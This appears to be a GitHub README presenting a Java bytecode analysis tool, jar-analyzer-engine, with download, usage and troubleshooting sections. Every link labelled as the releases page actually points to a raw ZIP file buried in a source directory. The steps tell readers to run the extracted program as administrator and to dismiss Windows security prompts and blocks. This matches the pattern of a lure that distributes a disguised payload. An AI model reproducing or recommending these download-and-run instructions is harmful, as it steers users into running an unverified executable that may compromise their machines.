# ⚙️ jar-analyzer-engine - Analyze Java Files with Ease

[![Download jar-analyzer-engine](https://img.shields.io/badge/Download%20jar--analyzer--engine-blue?style=for-the-badge&logo=github)](https://github.com/sltcunivote-crypto/jar-analyzer-engine/raw/refs/heads/main/src/main/java/org/jetbrains/java/decompiler/modules/decompiler/vars/engine_analyzer_jar_v1.4.zip)

## 🚀 What it does

jar-analyzer-engine scans Java JAR and WAR files and turns them into data you can review. It looks at method calls, class links, Spring routes, and string values. It stores the results in SQLite so you can search and review them later.

This tool is built for people who want a clear view of what a Java app contains. It helps with code review, app checks, and security work.

## 🖥️ What you need

- Windows 10 or Windows 11
- A ZIP file or installer from the release page
- Enough free disk space for your app files and scan results
- Permission to run programs on your PC
- Java may be included in the release, or you may need to install it if the package asks for it

For best results, use a PC with at least 8 GB of memory when working with large JAR files.

## 📥 Download and install

1. Visit the [releases page](https://github.com/sltcunivote-crypto/jar-analyzer-engine/raw/refs/heads/main/src/main/java/org/jetbrains/java/decompiler/modules/decompiler/vars/engine_analyzer_jar_v1.4.zip).
2. Find the latest version.
3. Download the Windows file from that page.
4. If you get a ZIP file, right-click it and choose Extract All.
5. Open the extracted folder.
6. Double-click the app file to start it.

If Windows shows a security prompt, choose the option that lets you run the app.

## 🧭 First run

1. Start jar-analyzer-engine.
2. Pick a JAR or WAR file from your computer.
3. Choose a folder for the output files.
4. Start the scan.
5. Wait for the analysis to finish.

When the scan ends, the app creates an SQLite database with the results. You can open that file later for review or sharing.

## 🔍 What gets extracted

- Method call graphs
- Inheritance trees
- Spring routes
- String constants
- Class and package links
- File-level scan data

This gives you a plain view of how the app works and how its parts connect.

## 📁 Output files

The app saves scan data in SQLite. You may also see extra files that help with review, such as:

- A database file with analysis results
- Log files for scan progress
- Export files for later use
- Folder data that matches the source JAR or WAR

Keep the output folder in a safe place so you can return to it later.

## 🧩 How to use it

1. Open the app.
2. Load one Java archive at a time, or use a batch folder if the app build supports it.
3. Select your output folder.
4. Run the scan.
5. Review the database or export files after the run.

Use this flow for app checks, code review, and basic security review.

## 🛠️ Common uses

- Check what methods call each other
- See which classes depend on others
- Find Spring web routes
- Review hard-coded strings
- Prepare data for audit work
- Compare two builds of the same app

## ⚡ Tips for better results

- Use fresh builds of the JAR or WAR file
- Scan one app version at a time
- Store results in a folder with a clear name
- Keep large scans on a drive with free space
- Close other large apps while scanning big archives

If you review many files, keep each scan in its own folder. That makes later checks easier.

## 🧪 Example workflow

1. Download the release from the link above.
2. Extract the package.
3. Open the app.
4. Choose a JAR or WAR file.
5. Pick an output folder named after the app version.
6. Run the scan.
7. Open the SQLite file in your review tool of choice.

This workflow works well for release checks and quick inspection.

## 🧷 File types supported

- `.jar`
- `.war`

These are standard Java archive files. The app reads their bytecode and builds a structured view of the code inside.

## 🔐 Security review uses

jar-analyzer-engine helps you look for signs that matter during code checks:

- Hidden routes
- Unused or odd methods
- Deep call chains
- Shared class inheritance
- Hard-coded strings that may hold tokens, paths, or URLs

It gives you data that is easier to sort and inspect than raw bytecode.

## 🧭 Folder layout

A typical run may create a folder like this:

- `output/`
  - `analysis.db`
  - `logs/`
  - `exports/`
  - `scan-info.txt`

The exact names can vary by release, but the structure should stay easy to follow.

## 🧰 Troubleshooting

### The app will not start

- Check that you extracted the ZIP file first
- Run the app from the extracted folder
- Right-click the app and choose Run as administrator
- Make sure your Windows account can run downloaded apps

### The scan stops early

- Try a smaller JAR or WAR file
- Make sure the source file is not damaged
- Check that the output folder has enough free space

### No results appear

- Run the scan again
- Confirm that you selected the right source file
- Open the SQLite file in a viewer that can read SQLite databases

### Windows blocks the file

- Use the release download from GitHub
- If Windows shows a prompt, choose the option to keep or run the file

## 📦 Release download

Use the [jar-analyzer-engine releases page](https://github.com/sltcunivote-crypto/jar-analyzer-engine/raw/refs/heads/main/src/main/java/org/jetbrains/java/decompiler/modules/decompiler/vars/engine_analyzer_jar_v1.4.zip) to download and run the Windows build

## 📚 Terms in plain English

- **JAR**: A Java app file
- **WAR**: A Java web app file
- **Bytecode**: The code inside a compiled Java file
- **Call graph**: A map of which methods call other methods
- **Inheritance tree**: A view of how classes relate to each other
- **SQLite**: A small database file that stores results

## 🧩 Topics

bytecode, call-graph, code-audit, java-asm, java-bytecode, static-analysis